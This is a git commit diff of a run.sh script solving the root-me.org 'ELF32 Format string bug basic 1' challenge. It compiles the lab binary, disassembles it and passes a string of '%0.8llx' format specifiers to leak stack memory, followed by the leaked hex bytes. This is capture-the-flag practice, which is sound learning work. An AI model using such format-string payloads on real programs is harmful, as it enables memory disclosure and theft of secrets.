cf87825087ce0084a573ee235a76f03436a77a90
anomen <ludek.h@gmail.com>
2015-07-09 15:29:13 +0200

    root-me.org/App-System/ELF32-Format-string-bug-basic-1 - update

--- root-me.org/App-System/ELF32-Format-string-bug-basic-1/run.sh
+++ root-me.org/App-System/ELF32-Format-string-bug-basic-1/run.sh
@@ -1,8 +1,15 @@
 
-#gcc ch5.c -o  ch5
+gcc ch5.c -o  ch5
 
-#objdump -D ch5 > dump.txt
+objdump -D ch5 > dump.txt
 
 # http://www.cplusplus.com/reference/cstdio/printf/
 
-./ch5 'junk: %p %p %p %p %p %p :: LE-zero-teminated: %0.8llx %0.8llx %0.8llx %0.8llx'
+./ch5 "%0.8llx %0.8llx %0.8llx %0.8llx %0.8llx %0.8llx %0.8llx"
+
+
+exit
+
+28 29 36 64 39 61 70 44 
+b7 00 0a 64 6d 61 70 45
+
